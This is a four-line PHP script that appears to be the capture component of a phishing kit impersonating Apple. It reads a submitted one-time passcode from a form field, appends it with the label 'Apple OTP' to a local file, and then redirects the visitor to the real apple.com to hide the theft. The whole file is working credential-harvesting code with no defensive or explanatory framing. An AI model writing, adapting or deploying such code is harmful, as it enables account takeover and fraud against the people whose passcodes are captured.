<?php
file_put_contents("otp.txt", "Apple OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.apple.com/');
?>
